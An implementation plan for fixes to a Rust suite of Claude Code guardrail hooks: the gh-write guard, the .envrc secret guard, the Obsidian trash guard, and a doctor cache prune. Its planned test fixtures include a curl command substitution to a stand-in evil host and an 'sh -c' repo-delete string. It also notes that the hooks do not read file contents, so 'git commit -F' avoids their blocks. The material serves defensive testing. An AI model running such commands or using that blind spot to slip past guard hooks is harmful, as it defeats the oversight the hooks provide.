# Guard False-Positives & Carve-outs — implementation plan

> Plan PR (draft). Refs `cameronsjo/cadence-hooks#212`, `#193`, `#192`, `#200` (one Refs line per task below). Implementer note: this is a batch of four **independent** guard fixes in the `cadence-hooks` Rust workspace. Execute them in any order; each is its own commit and its own CHANGELOG `[Unreleased]` bullet. A separate session with zero context from planning day executes this — every path, function, and command you need is inline. Planned 2026-07-06.

## Context

`cadence-hooks` is a Rust workspace (8 crates) compiling to one `cadence-hooks` binary that runs Claude Code guardrail hooks. Four tracker issues report guard **false-positives** or missing **carve-outs**, plus one destructive-maintenance feature. They cluster because each is a small/medium surgical change to one guard, batched for a single implementer pass.

Repo facts the implementer must honor (from `cadence-hooks/CLAUDE.md`):

- **Build/test:** `export PATH="$HOME/.cargo/bin:$PATH"` in *every* shell (the pre-commit hook shells out to cargo and aborts silently without it). `make ci` = `fmt-check` + `clippy -D warnings` + all tests. Run `cargo fmt --all` before `make ci` after writing long assert lines.
- **Guards fail open (ADR-0001, `docs/adr/0001-fail-open.md`):** parse failures, unreadable files, unknown subcommands exit 0/1, never 2. A guard's own failure must never block the user. Preserve this in every change here.
- **New shell-parsing logic that feeds a guard gets an adversarial `cadence-forge:security-reviewer` (Opus) pass before merge — TDD + CI green is not enough.** "Sees less of an executed command" = a silent **miss**, not fail-open. This applies to Tasks 1 (#212 gate logic — a wrong gate could *skip* a real `gh` write), 2 (#193 Bash `.envrc` content handling), and 3 (#192 redirect parsing).
- **A guard fix's own commit message / PR body can self-block.** A `git commit -m "…"` whose message quotes the very pattern the installed guard blocks (a `gh repo create … --public` string for #212, a `> .env` redirect for #193, an `rm` in a vault path for #192) is hard-blocked by the *installed* hook. Use `git commit -F <file>` and `gh pr create --body-file <file>` — file *content* is not inspected, only the Bash command string. (#212's repro is literally this class of bug.)
- **CHANGELOG:** each PR stages its own bullet under `## [Unreleased]` in `CHANGELOG.md` (line 7). Do **not** bump `Cargo.toml` — that auto-tags a release. Leave versioning to a later release session.
- Do **not** run `make bump`, create tags, or edit the tap. No `Cargo.toml` version changes.

Crate → package-name map for `cargo test -p`:

| Crate dir | Package | Owns |
|---|---|---|
| `crates/guardrails/` | `cadence-hooks-guardrails` | Task 1 (#212) |
| `crates/cadence/` | `cadence-hooks-cadence` | Task 2 (#193) |
| `crates/obsidian/` | `cadence-hooks-obsidian` | Task 3 (#192) |
| root `src/` | `cadence-hooks` (bin) | Task 4 (#200) |

## Issues covered

| # | Title (short) | Disposition | Design content | Size |
|---|---|---|---|---|
| 212 | `guard-gh-write` false-positives on commit-message prose | Fix confirmed; the issue's suggested direction is correct and clean because `command_segments` already unwraps `sh -c` | Low — one command-word gate | S |
| 193 | Extend `.envrc` content carve-out to the Bash read/write paths | Split recommended: ship the **read** carve-out now (sound); **write** carve-out is a decision point (harder, riskier) | Medium (read); high (write — see Decision D2) | S (read) / M (write) |
| 192 | Obsidian trash-guard: catch `>` truncation redirects into the vault | Fix confirmed; **requires a stat seam** — the one task with real design content (Decision D3) | High — inject a `FileMeta` trait | M |
| 200 | `doctor` prune of orphaned plugin-cache version dirs | Feature confirmed; **must be dry-run-default** (Decision D4) | Medium — new CLI surface + destructive `remove_dir_all` | M |

Claims verified against source (claims are claims, not facts):

- **#212** — `GhWriteGuard::run` (`crates/guardrails/src/guard_gh_write.rs:626`) early-returns unless `command.contains("gh")` (line 631). With no loop, it iterates `command_segments(command)` and calls `is_write_command(&segment)` (line 753), whose `WRITE_ACTIONS` regex (line 21) matches `gh <noun> <verb>` **anywhere in the segment string** — including inside a quoted `-m` message. Confirmed: the guard scans the raw segment substring, not a command-word-resolved gh invocation. The issue's repro (a commit message describing `gh repo create … --public`) matches `WRITE_ACTIONS` (`repo` + `create`). **The fix is clean** because `command_segments` (`crates/core/src/shell.rs:493`) already (a) keeps `git commit -m "…"` as a single segment whose command word is `git`, and (b) *unwraps* `sh -c '…'` wrappers, surfacing the inner `gh …` script as its **own** segment with command word `gh` (verified `shell.rs:476-529`; existing test `guard_gh_write.rs:1980` exercises `sh -c 'gh repo delete …'`). So gating the write-check on "segment command word == `gh`" drops the prose false-positive **and** preserves `sh -c` coverage.
- **#193** — The Bash arms name-block every `.envrc`. Read path: `bash_leaks_secrets` → `segment_env_read` → `is_dangerous_secret_token` (`prevent_secret_leaks.rs:43,58`); `is_env_family_secret(".envrc")` returns `true` (`secret_patterns.rs:129`). Test `bash_cat_envrc_blocked` (`prevent_secret_leaks.rs:1212`) confirms `cat .envrc` blocks. The **content-aware carve-out already exists** for the tool paths: `envrc_carveout_allows` + `envrc_content_is_secret` + `envrc_line_is_safe` (`secret_patterns.rs:218,179,186`), wired into the Read/Grep arms via `envrc_read_allowed` (`prevent_secret_leaks.rs:192`, reads the on-disk file) and into Write/Edit via `input.effective_content()` (`prevent_secret_writes.rs:295`). The Bash arms simply never call it — confirmed.
- **#192** — `ObsidianTrashGuard` (`crates/obsidian/src/trash_guard.rs`) is a pure function `check_destructive_in_vault(command, cwd, vault)` (line 56). `is_destructive` (line 36) catches `rm`/`unlink`/`shred`/`truncate`/`find -delete` but has **no redirect branch** — confirmed. There is no `stat`/filesystem access anywhere in the module; every test drives fake paths. So catching `>`-into-existing-vault-file genuinely requires new filesystem state, which is what breaks the pure-logic model.
- **#200** — `doctor::run` (`src/doctor.rs:691`) has `root` and `quiet` args only (`src/main.rs:111-118`, dispatched `main.rs:671`); **no `--fix`**. `orphan_findings` (`doctor.rs:515`) already computes the orphan set (siblings whose basename ≠ the manifest-pinned basename, `doctor.rs:552-569`) with symlink guards (`file_type().is_dir()`, never `path().is_dir()` which follows links). But it only **counts** orphans (`orphan_count`/`orphan_bytes`) — it discards the concrete `PathBuf`s a prune would delete. Confirmed: prune needs a new function that returns the paths.

## Approach (per issue)

### Task 1 — #212 (recommended fix, no options)

In `GhWriteGuard::run`, gate the no-loop segment scan on the segment's resolved command word being `gh`. Add a private helper near `gh_api_endpoint` (which already does the `tokenize(segment).first().rsplit('/')` command-word resolution at `guard_gh_write.rs:426-431`):

```rust
/// True when a command segment's resolved command word is `gh` (bare or a
/// `*/gh` basename). Gates the write-detection scan so gh-command substrings
/// appearing inside a quoted argument of another command — e.g. a
/// `git commit -m "…gh repo create…"` message — are not read as gh writes.
/// `command_segments` already unwraps `sh -c '…'` wrappers into their own
/// gh-command-word segments, so this preserves wrapped-write coverage (#212).
fn segment_command_is_gh(segment: &str) -> bool {
    tokenize(segment)
        .first()
        .map(|first| first.rsplit('/').next().unwrap_or(first) == "gh")
        .unwrap_or(false)
}
```

Then in the no-loop `for segment in command_segments(command)` loop (`guard_gh_write.rs:752`), add as the first line of the loop body, **before** `if !is_write_command(&segment)`:

```rust
if !segment_command_is_gh(&segment) {
    continue;
}
```

Do **not** touch the loop-analysis branches (`AllTargetsExplicit` / `MissingTargets` / `ParseFailed`, lines 640-742): those consume the AST loop parser's already-extracted `gh` commands, not raw prose, so they don't have this false-positive vector. Scope the change to the no-loop path only.

Rationale for not adopting a broader "strip quotes then scan" rewrite: the command-word gate is minimal, reuses the existing resolution idiom, and the `command_segments` unwrap already handles the one legitimate case (`sh -c 'gh …'`) that a naive gate would drop. This is exactly the issue's "restrict the gh-write match to segments whose command word is `gh`" — confirmed safe by the unwrap behavior.

### Task 2 — #193 (recommended fix + Decision D2)

**Read path (ship now, sound).** In `crates/cadence/src/prevent_secret_leaks.rs`, teach the Bash arm to carve out a pure-loader on-disk `.envrc`, mirroring the Read/Grep arm's `envrc_read_allowed` (line 192). The Bash arm resolves the offending token in `segment_env_read` (returns `(cmd_word, token)`). After `bash_leaks_secrets` gets a hit, before blocking, check: if the offending token's final path component is `.envrc` (case-insensitive), resolve it against `input.cwd` (relative) or use it as-is (absolute), read it from disk, and pass through `envrc_carveout_allows(".envrc", content)`. If it allows, continue scanning / allow.

Threading note: `bash_leaks_secrets(command)` (line 111) currently takes only the command string. It needs `input.cwd` to resolve a relative `.envrc`. Change its signature to `bash_leaks_secrets(command: &str, cwd: Option<&str>)` and pass `input.cwd.as_deref()` from the `"Bash"` arm (line 270). Reuse the fail-closed disk read from `envrc_read_allowed` (an unreadable/absent file → keep blocking). Do **not** classify a normalized path — use the literal token (the #129 trailing-space attack the existing code guards against).

**Write path (Decision D2 — recommend defer/split).** The write arm (`prevent_secret_writes.rs:314`, `bash_targets_env_file`) blocks `echo … > .envrc`, `cat > .envrc <<EOF`, `tee .envrc`, etc. Carving these out safely needs the **new** content being written, which for Bash is only reliably present in an inline heredoc/`echo` body — and extracting heredoc bodies from a command string is exactly the parsing surface the #149 security review flagged as a write-then-execute exfil hole. Reading the *on-disk* pre-write `.envrc` to classify a *write* is unsound (it classifies the old file, not the new content). **Recommendation:** ship the read carve-out under #193; either close #193 partially with a follow-up issue for the Bash write carve-out, or hold #193 open. See Decision D2 — Cameron's call.

### Task 3 — #192 (recommended fix + Decision D3, the stat seam)

Introduce a minimal `FileMeta` provider trait so the guard can ask "does this path already exist?" without hard-coding `std::fs`, preserving pure-function testability.

```rust
/// Filesystem existence probe for the redirect-truncation check. Injected so
/// the guard stays a pure function over fake paths in tests (#192): a `>`
/// redirect truncates only a file that ALREADY exists — distinguishing
/// truncate from benign new-file creation needs one stat at check time.
pub trait FileMeta {
    /// True iff `path` names an existing file (symlinks resolved by the real
    /// impl; the fake decides its own semantics).
    fn exists(&self, path: &str) -> bool;
}

/// Production impl over `std::fs`. Uses `symlink_metadata(...).is_ok()` — a
/// broken symlink still "exists" as a dir entry a `>` would clobber.
pub struct RealFs;
impl FileMeta for RealFs {
    fn exists(&self, path: &str) -> bool {
        std::fs::symlink_metadata(path).is_ok()
    }
}
```

Thread a `&dyn FileMeta` through `check_destructive_in_vault` (add a parameter) and pass `&RealFs` from `ObsidianTrashGuard::run` (line 108). Every existing test call site (`check_destructive_in_vault("rm …", cwd, vault)`) gains a fake argument — add a `struct FakeFs(HashSet<String>)` (or a closure-backed impl) in the test module; existing non-redirect tests can pass an empty `FakeFs` since they never hit the redirect branch.

New redirect branch, added to `check_destructive_in_vault` after the `is_destructive` check (or as a parallel gate): parse the command for **clobber** redirects (`>` and `>|`, but **not** `>>`) and their targets. The existing `redirect_targets` parser in `prevent_secret_writes.rs:24` is **not directly reusable** — it collects targets from `>>` too (it consumes the doubled operator but still records the append target, line 46-48). Decision D3 covers where the redirect parser lives. For each clobber target that (a) resolves into the vault (reuse the existing `looks_absolute` + `vault`/`vault_prefix` logic, lines 15-83) and (b) `meta.exists(target)` is true → block with a truncation-specific message (reuse the `.trash/` remediation shape). Keep `>>` and non-existing targets Allowed. `: > vault/note.md` (the truncate-to-empty idiom) falls out naturally: `:` is the command, `>` the redirect. Quote-awareness: the parser must treat a `>` inside quotes as literal (the `prevent_secret_writes` parser already does this — see D3).

### Task 4 — #200 (recommended fix + Decision D4)

Add prune capability to the `doctor` subcommand, **dry-run by default**.

- **CLI** (`src/main.rs`): add two flags to the `Doctor` variant (lines 111-118): `--prune` (list orphaned version dirs that would be removed; performs no deletion) and `--apply` (with `--prune`, actually delete). `--apply` without `--prune` is a usage error (exit 2). Update the dispatch at `main.rs:671` to pass them into `doctor::run`.
- **doctor.rs:** add a pure `orphan_dirs(pinned: &[(String, PathBuf)]) -> Vec<PathBuf>` that reuses the exact sibling-scan + symlink guards from `orphan_findings` (`doctor.rs:552-569`: `file_type().is_dir()` only, skip pinned basename) but returns the concrete orphan `PathBuf`s instead of a count. Refactor `orphan_findings` to call it (compute count/bytes from the returned vec) to avoid duplicating the scan logic. Add `prune_orphans(dirs: &[PathBuf], apply: bool) -> (usize, u64)` returning `(removed_count, freed_bytes)`; for each dir, re-verify with `std::fs::symlink_metadata` that it is a real directory (never a symlink) immediately before `std::fs::remove_dir_all` — TOCTOU-narrow, reuse `dir_size_bytes` (line 469) for the freed total. Fail-open per dir (an unremovable dir is skipped, not fatal).
- **Wiring:** prune keys off the same manifest path as `run` (`plugins.join("installed_plugins.json")` → `manifest_install_paths`, `doctor.rs:760`). Honor `root_override` so tests can drive a fixture cache (see Verification).

## Task breakdown

### Task 1 — #212 gh-write prose false-positive `[S]`

Refs `cameronsjo/cadence-hooks#212`.

- **Scope:** add `segment_command_is_gh` helper; gate the no-loop segment loop on it. No behavior change to loop branches.
- **Files:** `crates/guardrails/src/guard_gh_write.rs` only (helper near line 426; gate at line ~752-753).
- **Fixtures to add** (inline `#[cfg(test)]` module, integration-style via `GhWriteGuard.run` with `CADENCE_ALLOWED_OWNERS` set — see existing `input_with` helper around line 1980):
  - `git_commit_message_describing_gh_write_allowed` — `git commit -m "feat: warn-going-public blocks gh repo create --visibility public"` → Allow (headline repro).
  - `git_commit_message_gh_pr_create_allowed` — message containing `gh pr create` → Allow.
  - `sh_c_gh_write_still_blocked` — `sh -c 'gh repo delete evil/unowned --yes'` → Block (regression guard for the unwrap path; complements existing test at line 1980).
  - `bare_gh_write_still_blocked` — `gh repo create evil/x --public` (unowned) → Block.
  - Unit: `segment_command_is_gh` true for `gh …`, `/usr/bin/gh …`; false for `git commit -m "gh …"`, `echo gh pr create`.
- **Model:** `cadence:implementer` (sonnet) — spec is exact. Then a `cadence-forge:security-reviewer` (Opus) pass framed *"find a real gh write this gate now skips."*

### Task 2 — #193 `.envrc` Bash read carve-out `[S]`

Refs `cameronsjo/cadence-hooks#193`.

- **Scope:** Bash **read** path only (pending D2). Thread `cwd` into `bash_leaks_secrets`; carve out a pure-loader on-disk `.envrc` via `envrc_carveout_allows`.
- **Files:** `crates/cadence/src/prevent_secret_leaks.rs` (arm at 265-271, `bash_leaks_secrets` at 111, `segment_env_read` at 43). No changes to `secret_patterns.rs` (helpers already exist and are `pub(crate)`).
- **Fixtures to add** (inline module; use `tempfile::TempDir` + a `HookInput` carrying `cwd`, mirroring the Read-arm loader tests at `prevent_secret_leaks.rs:651-696`):
  - `bash_cat_pure_loader_envrc_allowed` — write `use flake\n` to `<tmp>/.envrc`, `cat .envrc` with `cwd=<tmp>` → Allow.
  - `bash_cat_secret_envrc_still_blocked` — `.envrc` containing `export API_KEY=xyz` → Block.
  - `bash_cat_envrc_missing_file_fails_closed` — `cat .envrc` with a cwd lacking the file → Block.
  - `bash_cat_envrc_metachar_still_blocked` — `.envrc` with `PATH=$(curl https://evil.example)` → Block (the `envrc_line_is_safe` metachar firewall, `secret_patterns.rs:204`).
  - Keep `bash_cat_envrc_blocked` (line 1212) passing by updating it to reflect that a *secret* `.envrc` (or unavailable content) still blocks, OR point it at a genuinely-secret body — do not delete the coverage.
- **Model:** `cadence:implementer` (sonnet) + `cadence-forge:security-reviewer` (Opus) framed *"can this carve-out be tricked into allowing a secret-bearing `.envrc` read?"* (trailing-space sibling, symlink, relative-vs-absolute cwd resolution).

### Task 3 — #192 obsidian truncation redirect `[M]`

Refs `cameronsjo/cadence-hooks#192`.

- **Scope:** add `FileMeta` trait + `RealFs`; thread `&dyn FileMeta` through `check_destructive_in_vault`; add a clobber-redirect (`>`/`>|`, not `>>`) branch that blocks when the target resolves into the vault AND already exists.
- **Files:** `crates/obsidian/src/trash_guard.rs` (all call sites + tests). Plus, per D3, possibly `crates/core/src/shell.rs` if promoting a shared clobber-redirect parser.
- **Fixtures to add** (extend the inline module; add a `FakeFs`):
  - `truncate_redirect_existing_vault_file_blocked` — `echo hi > note.md`, cwd in vault, `FakeFs` says `note.md` exists → Block.
  - `create_redirect_new_vault_file_allowed` — same command, `FakeFs` says it does **not** exist → Allow (new-file creation).
  - `append_redirect_vault_file_allowed` — `echo hi >> note.md`, file exists → Allow (`>>` stays allowed).
  - `colon_truncate_existing_vault_file_blocked` — `: > note.md`, exists → Block.
  - `redirect_out_of_vault_allowed` — `echo hi > /tmp/x.md`, exists → Allow.
  - `quoted_redirect_in_prose_allowed` — `git commit -m "use > carefully"` in vault → Allow (no real redirect; quote-awareness).
  - `redirect_explicit_vault_path_from_outside_blocked` — `echo hi > /vault/note.md` from cwd `/home`, exists → Block.
- **Model:** `cadence:implementer` (sonnet) for the trait + wiring; **but** the redirect parser is new shell-parsing feeding a guard → mandatory `cadence-forge:security-reviewer` (Opus) framed *"find a truncating redirect into the vault this parser misses (a miss), and a benign create this wrongly blocks."*

### Task 4 — #200 doctor prune `[M]`

Refs `cameronsjo/cadence-hooks#200`.

- **Scope:** `--prune` (dry-run) / `--apply` flags; `orphan_dirs` + `prune_orphans`; refactor `orphan_findings` onto `orphan_dirs`.
- **Files:** `src/main.rs` (Doctor variant + dispatch), `src/doctor.rs` (new fns + `run` signature/threading), `tests/doctor.rs` (integration).
- **Fixtures to add:**
  - Inline (`src/doctor.rs` tests): `orphan_dirs_returns_stale_siblings` (pinned dir + two sibling SHA dirs → returns the two); `orphan_dirs_skips_symlinked_sibling` (a symlinked sibling is never returned); `prune_orphans_dry_run_deletes_nothing` (`apply=false` → dirs still exist, returns count); `prune_orphans_apply_removes` (`apply=true` → dirs gone, freed bytes > 0); `prune_orphans_skips_symlink_target` (a symlink handed in is not `remove_dir_all`'d).
  - Integration (`tests/doctor.rs`, `--root`-driven, mirror `write_cached_plugin` fixtures at lines 31-66): `doctor_prune_dry_run_lists_orphans_exits_zero`; `doctor_prune_apply_removes_orphans`; `doctor_apply_without_prune_is_usage_error` (exit 2).
- **Model:** `cadence:implementer` (sonnet). Destructive `remove_dir_all` → a `cadence-forge:security-reviewer` (Opus) pass framed *"can prune delete the active pinned dir, follow a symlink out of the cache, or delete outside the cache root?"*

## Sequencing & dependencies

**No cross-dependencies — confirmed.** Each task touches a different crate/file and a distinct guard; no shared function is co-edited:

- Task 1 → `crates/guardrails/` only.
- Task 2 → `crates/cadence/src/prevent_secret_leaks.rs` (helpers in `secret_patterns.rs` are read-only reuse).
- Task 3 → `crates/obsidian/` (plus optionally `crates/core/src/shell.rs` per D3 — the only possible cross-file touch, and it's additive; no other task edits `shell.rs`).
- Task 4 → root `src/` + `tests/doctor.rs`.

Each is independently shippable as its own PR (recommended: four PRs, four `[Unreleased]` bullets) or one batched PR with four commits. If batched, note the four Refs lines separately; do not bundle a `Cargo.toml` bump. Parallel-worktree dispatch is safe (no shared writes) — the only shared file, `CHANGELOG.md`, is a union-merge target (add each bullet under `[Unreleased]`; expect a trivial union merge). No task blocks another; no ordering constraint.

The only open PR in the repo is **#127** (`chore/relicense …`) — orthogonal (license headers), zero overlap with any task here.

## Verification

Always `export PATH="$HOME/.cargo/bin:$PATH"` first. Per-task evidence:

**Task 1 (#212):**

```
cargo test -p cadence-hooks-guardrails guard_gh_write
cargo test -p cadence-hooks-guardrails segment_command_is_gh
```

Manual behavior proof (build the bin first — `cargo test` does NOT build `[[bin]]`, a pipe-probe otherwise gives a misleading exit 127):

```
cargo build --bin cadence-hooks
CADENCE_ALLOWED_OWNERS=cameronsjo printf '%s' '{"tool_name":"Bash","tool_input":{"command":"git commit -m \"feat: warn-going-public blocks gh repo create --visibility public\""},"cwd":"/tmp"}' | ./target/debug/cadence-hooks guardrails guard-gh-write; echo "exit=$?"
```

Expect exit 0 (allow). Then swap the command to a bare `gh repo create evil/x --public` and confirm exit 2 (block).

**Task 2 (#193):**

```
cargo test -p cadence-hooks-cadence prevent_secret_leaks
cargo test -p cadence-hooks-cadence envrc
```

Manual: create `/tmp/t/.envrc` with `use flake`, pipe a Bash payload `{"tool_name":"Bash","tool_input":{"command":"cat .envrc"},"cwd":"/tmp/t"}` to `./target/debug/cadence-hooks cadence prevent-secret-leaks` → exit 0; rewrite the file with `export API_KEY=x` → exit 2.

**Task 3 (#192):**

```
cargo test -p cadence-hooks-obsidian trash_guard
```

All fake-driven; no live vault needed. Confirm the append and new-file cases are Allow and the existing-file `>` case is Block in the test output.

**Task 4 (#200):**

```
cargo test -p cadence-hooks doctor
cargo test --test doctor
```

Manual dry-run vs apply against a fixture cache (use a `--root` tempdir with a pinned dir + orphan siblings, mirroring `tests/doctor.rs`): `./target/debug/cadence-hooks doctor --root <fixture> --prune` lists and leaves dirs; add `--apply` and confirm the orphan dirs are gone and the pinned dir remains.

**Whole batch, pre-PR:**

```
cargo fmt --all && make ci
```

`make ci` must be green (fmt-check + `clippy -D warnings` + all tests). Note: local `make ci` green does not guarantee CI green if the local toolchain trails CI's clippy — treat the first GitHub CI run as the real clippy verdict, or `rustup update` first. Run `cadence-forge:security-reviewer` (Opus) on Tasks 1, 2, 3 (shell-parsing/gate changes) and Task 4 (destructive `remove_dir_all`) before opening PRs — this is a repo gate, not optional. Commit via `git commit -F <file>` / `gh pr create --body-file <file>` to avoid the guard self-blocking on quoted patterns.

## Decision points (Cameron's calls)

- **D1 — one batched PR or four separate PRs?** *Recommendation: four separate PRs* (one per issue). Each is independently reviewable, gets its own CHANGELOG bullet and Refs line, and a single security-review framing. The batch shares no code, so four PRs cost only a little more ceremony and keep the merge/rollback surface clean. Choose one PR only if you want a single review sitting.

- **D2 — #193 scope: read-only now, or read + write?** *Recommendation: ship the Bash **read** carve-out (`cat .envrc`) under #193 now; split the Bash **write** carve-out (`cat > .envrc`, heredocs) into a follow-up issue and leave it deferred.* The read path classifies a real on-disk file — sound and low-risk. The write path needs the *new* content, which for Bash lives only in inline heredoc/`echo` bodies; extracting those is exactly the write-then-execute exfil surface the #149 security review flagged, and reading the pre-write on-disk file to classify a write is unsound. Alternative: attempt a narrow heredoc-only write carve-out (M, higher risk, mandatory adversarial review) — only if you want #193 fully closed this pass.

- **D3 — #192 redirect parser location: promote to `core::shell` or reimplement in obsidian?** *Recommendation: add a small clobber-only redirect extractor to `crates/core/src/shell.rs`* (e.g. `clobber_redirect_targets(segment) -> Vec<String>`, returning only `>`/`>|` targets, excluding `>>`), and call it from both the obsidian guard and — as a fast-follow or now — let `prevent_secret_writes::redirect_targets` share the quote-aware scanning core. The existing `redirect_targets` (`prevent_secret_writes.rs:24`) is quote-aware but records `>>` targets too, so it can't be reused verbatim. Promoting one well-reviewed parser beats a second hand-rolled quote-scanner in the obsidian crate (a fresh parser is a fresh miss surface). Alternative: reimplement locally in `trash_guard.rs` (keeps crates decoupled, but duplicates subtle quote-handling and doubles the review burden).

- **D4 — #200 prune UX: `--prune`/`--apply` flags vs a dedicated `doctor prune-cache` subcommand, and dry-run shape?** *Recommendation: `doctor --prune` (dry-run listing by default) + `doctor --apply` to actually delete, `--apply` without `--prune` = usage error.* Rationale: default-safe (dry-run) is the right posture for an `rm -rf` on cache dirs; it reuses the existing `doctor` command surface (no new subcommand plumbing in clap/registry) and the orphan set doctor already computes; and default-dry-run with an explicit `--apply` opt-in is a clearer contract than a `--dry-run` flag on a command that otherwise deletes. Alternative: a dedicated `doctor prune-cache [--dry-run]` subcommand if you'd rather isolate the destructive verb from the read-only `doctor` — cleaner separation, but more CLI surface. Corroboration option (issue suggested): require a `.orphaned_at` marker before deleting — *not recommended as a gate* (Claude Code doesn't always write it); mention it in `--prune` output as extra signal if present, but key deletion off the manifest-orphan set doctor already trusts.

## Out of scope

- Any `Cargo.toml` version bump, tag, release, or homebrew-tap edit (a separate release session owns this).
- The #193 Bash **write** carve-out (deferred per D2 unless Cameron opts in).
- Changing the loop-analysis branches of `guard_gh_write` (#212 is the no-loop prose vector only).
- Broadening the obsidian guard beyond the `>` clobber-into-existing-file case — `>>` stays allowed, new-file creation stays allowed, no new destructive verbs (#192 is redirect-truncation only).
- Pruning anything other than orphaned SHA-pinned version dirs — no marketplace-remote remediation, no telemetry cleanup, no touching the active pinned dir (#200 is orphan version dirs only).
- Migrating `redirect_targets`/`writer_targets` semantics in `prevent_secret_writes` beyond what D3's optional shared-parser extraction requires.
